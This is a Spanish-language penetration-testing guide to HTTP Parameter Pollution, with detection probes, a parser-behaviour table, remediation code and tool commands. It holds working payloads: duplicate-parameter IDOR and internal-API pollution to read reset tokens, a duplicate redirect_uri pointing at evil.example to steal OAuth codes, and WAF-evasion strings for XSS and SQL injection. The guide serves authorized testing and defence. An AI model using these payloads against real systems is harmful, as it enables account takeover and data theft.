# Contaminación de parámetros HTTP (HPP, HTTP Parameter Pollution)

| Clasificación | |
|---|---|
| CWE | CWE-235 — Manejo incorrecto de parámetros adicionales. Relacionadas: CWE-88 (inyección de argumentos/delimitadores), CWE-436 (discrepancia de interpretación entre componentes) |
| OWASP Top 10:2025 | A05 — Injection (inyección de parámetros en peticiones internas); A06 — Insecure Design cuando la causa es la discrepancia entre capas |
| OWASP API Top 10:2023 | API8 — Security Misconfiguration; API1/API3 cuando termina en IDOR o modificación de propiedades |
| WSTG | WSTG-INPV-04 |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (tabla de analizadores, HPP en servidor, contaminación de parámetros en peticiones internas, HPP en cliente, JSON, cabeceras/cookies, GraphQL) · 5. Evasión de WAF con HPP · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

HTTP no define qué hacer cuando un parámetro aparece **varias veces** (`?id=1&id=2`). Cada tecnología decide: quedarse con el primero, con el último, unirlos con comas o devolver una lista. La HPP aprovecha que **dos componentes** de la cadena (WAF, proxy, pasarela de API, aplicación, servicio interno) **eligen valores distintos**, o que la aplicación **concatena** la entrada del usuario dentro de otra petición sin codificarla.

Variantes:

- **HPP del lado del servidor (precedencia)**: la validación lee un valor y la lógica usa otro (`?user=yo&user=victima`).
- **Contaminación de parámetros en peticiones internas** (*server-side parameter pollution*): la aplicación construye una petición a una API interna con la entrada del usuario; inyectando `&`, `#`, `/` o comillas JSON se añaden o sobrescriben parámetros que el usuario no debería controlar.
- **HPP del lado del cliente**: la página genera enlaces o formularios con el parámetro sin codificar; inyectando `%26` (un `&` codificado) se añaden parámetros a esos enlaces.
- **Duplicados en JSON, cabeceras y cookies**: el mismo problema con claves JSON repetidas, cabeceras duplicadas o cookies con el mismo nombre.

## 2. Dónde buscar (señales del reconocimiento)

- Arquitecturas con varias capas: CDN/WAF → pasarela de API → backend → microservicios (cabeceras `Via`, `X-Amzn-*`, `X-Kong-*`, `cf-ray`, `x-envoy-*`).
- Funciones que reenvían la entrada a otro servicio: búsqueda de usuarios, pagos (`amount`, `currency`, `merchant`), envío de correos, botones de compartir en redes sociales, *webhooks*, proxys de API, exportaciones.
- Parámetros con semántica de seguridad: `id`, `user`, `account`, `role`, `amount`, `price`, `redirect_uri`, `scope`, `token`, `csrf`, `email`.
- Respuestas que cambian al añadir `&x=y` codificado (`%26x%3Dy`) dentro de un valor.
- Errores que delatan una API interna (`Invalid field`, `Parameter 'x' is not supported`, mensajes de otro framework).
- OAuth/SAML, enlaces de cancelación de suscripción, enlaces firmados (firma calculada sobre un valor y uso de otro).

## 3. Detección segura (primeras sondas, no destructivas)

Usar valores de la **cuenta de prueba** y operaciones de lectura.

1. **Precedencia**: enviar `?q=crvsA&q=crvsB` y observar cuál se refleja o usa (primero, último, `crvsA,crvsB`, lista). Repetir en el cuerpo y mezclando query + cuerpo.
2. **Notación de arrays**: `q[]=a&q[]=b`, `q[0]=a&q[1]=b`, `q=a&q[]=b` (error o tipo inesperado = pista).
3. **Inyección de separadores** en un único valor (comparar con la respuesta base):
   ```text
   q=crvs%26x%3Dy          # & codificado: ¿aparece un parámetro nuevo en la petición interna?
   q=crvs%23               # # codificado: ¿se trunca el resto de la query interna?
   q=crvs%26               # & suelto: ¿error "parámetro vacío/inválido"?
   q=crvs%3Bx%3Dy          # ; (algunos analizadores lo usan como separador)
   ```
4. **Parámetros internos plausibles**: `q=crvs%26field=email`, `%26role=`, `%26admin=`, `%26publicProfile=false`; observar cambios de respuesta o errores tipo «campo no válido» (que confirman que se inyecta).
5. **Rutas internas (REST)**: `q=crvs%2f..%2fcrvs` o `q=../crvs`; si la respuesta es idéntica a `q=crvs`, la entrada se usa en una ruta y se normaliza.
6. **JSON interno**: `"name":"crvs\",\"x\":\"y"`; un error de validación distinto indica que la cadena se inserta en JSON sin escapar.

## 4. Explotación por contexto o tecnología

### 4.1 Comportamiento de los analizadores ante `a=1&a=2`

Verificar siempre empíricamente: depende de versión y configuración.

| Tecnología / API | Resultado de `a=1&a=2` |
|---|---|
| PHP (`$_GET['a']`) | `2` (último); `a[]=1&a[]=2` → array |
| ASP clásico / ASP.NET Web Forms y MVC (`Request.QueryString["a"]`) | `1,2` (unidos con coma) |
| ASP.NET Core (`Request.Query["a"]`) | `StringValues` con ambos; `ToString()` → `1,2`; el *model binding* a `string` toma el primero (verificar) |
| Java Servlet / JSP (`getParameter`) | `1` (primero); `getParameterValues` → ambos |
| Spring (`@RequestParam String a`) | `1,2` (convierte el array en cadena con comas); con `List<String>` → ambos |
| Python Flask (`request.args.get`/`['a']`) | `1` (primero); `getlist` → ambos |
| Python Django (`request.GET['a']`/`.get`) | `2` (último); `getlist` → ambos |
| FastAPI / Starlette (`a: str`) | último (verificar); `List[str]` → ambos |
| Python Tornado (`get_argument`) | `2` (último) |
| `urllib.parse.parse_qs` | lista; `dict(parse_qsl(…))` → último |
| Node.js `querystring` / Express 5 (parser *simple*) | `['1','2']` (array) |
| Express 4 (`qs`, parser *extended*) | `['1','2']`; además objetos anidados `a[b]=c` |
| `URLSearchParams.get` (navegador, Deno, Workers) | `1` (primero); `getAll` → ambos |
| Ruby Rack / Rails (`params[:a]`) | `2` (último); `a[]=` → array |
| Go `net/http` (`r.URL.Query().Get`, `r.FormValue`) | `1` (primero); `r.Form["a"]` → ambos |
| Gin (`c.Query`) | `1` (primero); `c.QueryArray` → ambos |
| Perl CGI (`param` en escalar) | `1` (primero) |
| Nginx (`$arg_a`) | `1` (primero) |
| AWS API Gateway REST (`queryStringParameters`) | `2` (último); `multiValueQueryStringParameters` → ambos |
| AWS API Gateway HTTP API (payload 2.0) | `1,2` (unidos con coma) |

Ejemplos de discrepancias explotables:

```text
# Pasarela valida el primer id (el propio), backend usa el último → IDOR
GET /api/orders?id=<id_propio>&id=<id_ajeno>
# Firma calculada sobre el primer valor, ejecución con el último
GET /download?file=publico.pdf&sig=<firma_valida>&file=privado.pdf
# Comprobación de propiedad en un componente y uso en otro (query vs cuerpo)
POST /api/transfer?from=<cuenta_propia>
from=<cuenta_ajena>&to=<cuenta_propia>&amount=1
```
⚠️ Cualquier operación sobre recursos o cuentas ajenas reales **requiere confirmación explícita del cliente**: usar dos cuentas de prueba del auditor (A y B) para demostrar acceso cruzado. Operaciones de dinero solo con importes mínimos en entorno de pruebas.

### 4.2 Contaminación de parámetros en peticiones internas (query string)

La aplicación recibe `GET /userSearch?name=peter&back=/home` y llama internamente a `GET /users/search?name=peter&publicProfile=true`.

```text
name=peter%23                         → /users/search?name=peter#&publicProfile=true    (trunca: ¿muestra perfiles privados?)
name=peter%26publicProfile=false      → …?name=peter&publicProfile=false&publicProfile=true
name=peter%26email=x                  → error "parámetro no válido" confirma la inyección
name=peter%26field=reset_token        → si la API interna admite selección de campos
name=administrator%26field=reset_token%23
```

Enumerar nombres de parámetro internos con Burp Intruder (lista de nombres comunes) sobre la posición `name=peter%26§x§=1`.

### 4.3 Contaminación en rutas REST internas

Si la aplicación construye `/api/users/{name}/profile`:

```text
name=peter%2f..%2fadmin                         → /api/users/peter/../admin/profile
name=..%2f..%2f..%2fopenapi.json%23             → descubrir la documentación interna de la API
name=..%2f..%2fv1%2fusers%2fadministrator%2ffield%2fpasswordResetToken%23
```
Ver también `vulns/path-traversal-lfi.md` y `vulns/ssrf.md`.

### 4.4 Contaminación en cuerpos JSON internos

Si la entrada se inserta en una plantilla JSON sin escapar:

```text
name=peter","access_level":"administrator
→ {"name":"peter","access_level":"administrator","access_level":"user"}   (¿gana el primero o el último?)
```
En JSON de entrada que se reenvía: `{"name":"peter\",\"access_level\":\"administrator"}`.

### 4.5 Claves JSON duplicadas y discrepancias de analizadores

```json
{"role":"user","role":"admin"}
{"amount":1,"amount":1000}
{"role":"user","ROLE":"admin"}
```

- La mayoría (JavaScript `JSON.parse`, Python `json`, Go `encoding/json`, Jackson por defecto, PHP `json_decode`, Ruby) se quedan con el **último**.
- Otros rechazan duplicados (Rust `serde` en estructuras, Jackson con `STRICT_DUPLICATE_DETECTION`) y algunos analizadores o validadores toman el **primero**.
- Go `encoding/json` hace coincidir claves **sin distinguir mayúsculas** al deserializar en estructuras (`ROLE` puede rellenar `Role`).
- Escenario típico: un servicio valida con un analizador (primero) y otro ejecuta con otro (último). Ver investigación de Bishop Fox sobre interoperabilidad JSON.

### 4.6 HPP del lado del cliente

La página refleja un parámetro dentro de enlaces o formularios sin codificarlo:

```text
https://t.example/poll?id=7%26vote=2
→ <a href="/vote?id=7&vote=2&vote=1">Votar</a>     (el usuario «vota» lo que eligió el atacante)
https://t.example/article?u=1%26action=unsubscribe
https://t.example/share?url=https://t.example/x%26text=mensaje-alterado
```
Útil para manipular acciones de un clic, botones de compartir y enlaces firmados.

### 4.7 Cabeceras y cookies duplicadas

```http
Cookie: role=user; role=admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 203.0.113.9
Host: t.example
Host: interno.t.example
Transfer-Encoding: chunked
Transfer-Encoding: identity
```
El comportamiento varía por proxy y servidor; cabeceras duplicadas en `Host` y `Transfer-Encoding` pertenecen a `vulns/host-header.md` y `vulns/request-smuggling.md`.

### 4.8 GraphQL y WebSocket

```graphql
query { a: user(id: 1) { email } b: user(id: 2) { email } }      # alias: multiplica operaciones (rate limit)
mutation { a: redeem(code:"X"){ok} b: redeem(code:"X"){ok} }      # ⚠️ canje múltiple: requiere confirmación explícita del cliente
```
Argumentos duplicados (`user(id:1, id:2)`) deberían rechazarse según la especificación; comprobar implementaciones permisivas. Ver `vulns/graphql.md` y `vulns/race-condition.md`.

### 4.9 OAuth y SSO

```text
/authorize?client_id=APP&redirect_uri=https://t.example/cb&redirect_uri=https://evil.example/cb
/authorize?...&scope=read&scope=admin
```
Si el servidor de autorización valida un `redirect_uri` y usa otro, se roba el código (ver `vulns/oauth-oidc-saml.md`).

## 5. Evasión de filtros y WAF

**Repartir la carga entre duplicados** cuando el backend concatena (ASP.NET, Spring `String`, API Gateway HTTP API):

```text
?q=<svg/&q=onload=alert(1)>               → "<svg/,onload=alert(1)>"
?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3   → "1/*,*/UNION/*,*/SELECT/*,*/1,2,3" (las comas quedan dentro de comentarios)
```

**El WAF inspecciona un valor y la aplicación usa otro**:

```text
?q=inofensivo&q=<svg onload=alert(1)>      # backend "último" (PHP, Django, Rails)
?q=<svg onload=alert(1)>&q=inofensivo      # backend "primero" (Flask, Go, Java)
```

**Disfrazar el nombre del parámetro** (*parameter cloaking*) para que el WAF no lo agrupe con el original:

```text
?q=ok&%71=<payload>                 # %71 = "q"
?q=ok&Q=<payload>                   # backends que no distinguen mayúsculas
?q=ok&q%00=<payload>                # analizadores antiguos
?q=ok;q=<payload>                   # ";" como separador en algunos backends (también envenenamiento de caché)
?q[]=<payload>                      # cambia el tipo y evita la regla
```

**Mover el parámetro**: query ↔ cuerpo ↔ multipart ↔ JSON, ya que muchos frameworks fusionan fuentes con prioridades distintas (`$_REQUEST`, `request.values` en Flask, `params` en Rails).

Ver `vulns/waf-bypass.md` y, para el uso de `;` y parámetros no cacheados, `vulns/cache-poisoning-deception.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **IDOR / control de acceso**: demostrar con dos cuentas de prueba que la cuenta A lee o modifica datos de B (ver `vulns/access-control-idor.md`).
- **Peticiones internas**: leer campos ocultos (por ejemplo, `reset_token`) **de la cuenta de prueba** y mostrar solo los primeros caracteres; nunca usar tokens de usuarios reales. Una toma de cuenta completa **requiere confirmación explícita del cliente**.
- **Lógica de negocio**: precio, cantidad o cupones (ver `vulns/business-logic.md`); ⚠️ compras o canjes reales requieren confirmación explícita del cliente.
- **Elusión de WAF** para materializar otra vulnerabilidad (XSS, SQLi): el impacto es el de la vulnerabilidad final.
- **OAuth**: robo de código con `redirect_uri` duplicado.
- **Envenenamiento de caché**: parámetros con `;` que la caché ignora y el backend usa.

## 7. Caja blanca: fuentes, sumideros y patrones de código

```python
# Vulnerable: concatenar la entrada en la URL de una API interna
r = requests.get(f"http://users-api/search?name={request.args['name']}&publicProfile=true")
# Seguro: que la biblioteca codifique cada parámetro
r = requests.get("http://users-api/search", params={"name": request.args["name"], "publicProfile": "true"})
```

```javascript
// Vulnerable
const url = `http://api.internal/users/${req.query.name}/profile?view=public`;
// Seguro
const name = String(req.query.name ?? '');
if (!/^[a-zA-Z0-9_.-]{1,64}$/.test(name)) return res.status(400).end();
const u = new URL(`http://api.internal/users/${encodeURIComponent(name)}/profile`);
u.searchParams.set('view', 'public');
// Duplicados: rechazar arrays donde se espera una cadena
if (Array.isArray(req.query.id)) return res.status(400).end();
```

```java
// Vulnerable: validar con getParameter (primero) y usar otro origen (cuerpo/último)
String id = request.getParameter("id");
// Seguro: exigir exactamente un valor
String[] ids = request.getParameterValues("id");
if (ids == null || ids.length != 1) throw new BadRequestException();
```

Patrones a revisar:

- Construcción de URLs o cuerpos internos con concatenación/plantillas (`f"…?a={x}"`, `"…&a=" + x`, `` `…${x}` ``, `String.format`), sin `urlencode`/`encodeURIComponent`.
- Mezcla de fuentes: `$_REQUEST`, `request.values`, `params` (Rails), `req.param()` (Express antiguo), `[FromQuery]` + `[FromBody]` del mismo campo.
- Comprobaciones de autorización sobre un valor (`req.query.id`) y uso de otro (`req.body.id`).
- Firmas HMAC calculadas sobre la cadena cruda pero verificadas tras analizar (o al revés).
- Plantillas JSON construidas a mano.

```bash
rg -n 'requests\.(get|post)\(\s*f["'\'']|urlopen\(\s*f["'\'']|fetch\(\s*`|axios\.(get|post)\(\s*`|http\.(get|request)\(\s*`|RestTemplate.*\+\s*\w|HttpRequest\.newBuilder\(.*\+' -g '!node_modules'
rg -n '\$_REQUEST|request\.values|req\.param\(|getParameter\(|getParameterValues\(' 
rg -n '["'\'']\s*\+\s*\w+\s*\+\s*["'\'']&|&\w+=["'\'']\s*\+|\?\w+=\{' -g '*.{py,js,ts,java,go,php,rb,cs}'
```

```bash
semgrep --config p/owasp-top-ten --config p/python --config p/javascript .   # complementar con revisión manual de construcción de URLs internas
```

## 8. Falsos positivos frecuentes

- La aplicación usa siempre el mismo valor en todas las capas (comportamiento coherente): duplicar no cambia nada.
- `%26` aparece decodificado en la respuesta pero solo como texto (reflejo), sin llegar a una petición interna.
- Errores 400 ante duplicados: la aplicación los rechaza (comportamiento correcto).
- Diferencias de respuesta debidas a la caché, no al parámetro.
- «WAF bypass» que solo evita la regla pero la carga resultante no se ejecuta en el backend.

## 9. Evidencia mínima para validarlo

- Petición base y petición contaminada, con las respuestas que demuestran qué valor usa cada capa.
- Para peticiones internas: la inyección mínima que cambia el comportamiento (error de parámetro, truncamiento con `%23`) y el resultado de impacto sobre la cuenta de prueba.
- Para precedencia entre capas: identificación de los componentes (cabeceras de pasarela/WAF) y del valor que procesa cada uno.
- Para elusión de WAF: petición bloqueada vs. petición contaminada aceptada y ejecutada.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Discrepancia sin impacto de seguridad | Informativo | — |
| HPP en cliente que altera una acción de un clic | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = 4.3 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| IDOR de lectura por precedencia | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5 | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Inyección en API interna que expone tokens → toma de cuentas | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 (`PR:L` = 8.1) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Elusión de WAF | Puntuar la vulnerabilidad final que se materializa | — |

## 11. Remediación (con ejemplo de código correcto)

1. **Rechazar duplicados** donde se espera un único valor (respuesta 400) y validar con esquema (OpenAPI/JSON Schema) en la pasarela y en la aplicación.
2. **Coherencia entre capas**: misma política (o normalización explícita) en CDN, WAF, pasarela y backend; registrar duplicados.
3. **Nunca concatenar** entrada del usuario en URLs, rutas o JSON internos: usar constructores (`URLSearchParams`, `params=` de requests, `UriComponentsBuilder`, serializadores JSON) y validar con listas blancas de caracteres.
4. No mezclar fuentes de parámetros (query/cuerpo) para el mismo campo; leer de una sola.
5. Firmas calculadas sobre la representación **canónica** que luego se usa.
6. Analizadores JSON estrictos con detección de duplicados en límites de confianza (Jackson `STRICT_DUPLICATE_DETECTION`, `serde`).
7. WAF configurado para inspeccionar todos los valores y todas las fuentes.

```javascript
// Express: rechazar duplicados de query
app.use((req, res, next) => {
  for (const [k, v] of Object.entries(req.query)) {
    if (Array.isArray(v) && !k.endsWith('[]')) return res.status(400).json({ error: `parámetro duplicado: ${k}` });
  }
  next();
});
```

```java
// Jackson: fallar ante claves duplicadas
ObjectMapper om = JsonMapper.builder().enable(StreamReadFeature.STRICT_DUPLICATE_DETECTION).build();
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater | Duplicar parámetros, mover entre query/cuerpo, inyectar `%26`/`%23` | Siempre, primero |
| Burp Intruder | Enumerar nombres de parámetros internos (`name=peter%26§x§=1`) | Tras confirmar inyección |
| Param Miner (BApp) | Descubrir parámetros ocultos (*Guess params*) | Reconocimiento de parámetros |
| Arjun | `arjun -u https://t.example/api/search` | Descubrimiento de parámetros |
| Schemathesis | `schemathesis run openapi.json --url https://t.example` | APIs con OpenAPI, para probar duplicados y valores inesperados (con autorización) |
| `semgrep` / `rg` | Sección 7 | Caja blanca |

## 13. Referencias

- OWASP WSTG-INPV-04 (Testing for HTTP Parameter Pollution).
- Luca Carettoni y Stefano di Paola — «HTTP Parameter Pollution» (OWASP AppSec EU 2009): tabla original de comportamientos.
- PortSwigger Web Security Academy — *Server-side parameter pollution* (API testing).
- Bishop Fox — «An Exploration of JSON Interoperability Vulnerabilities» (2021).
- PayloadsAllTheThings — *HTTP Parameter Pollution*.
- HackTricks — *Parameter Pollution*.
- CWE-235, CWE-88, CWE-436.
- Adaptado en parte de SnailSploit *offensive-checklist* (licencia MIT).
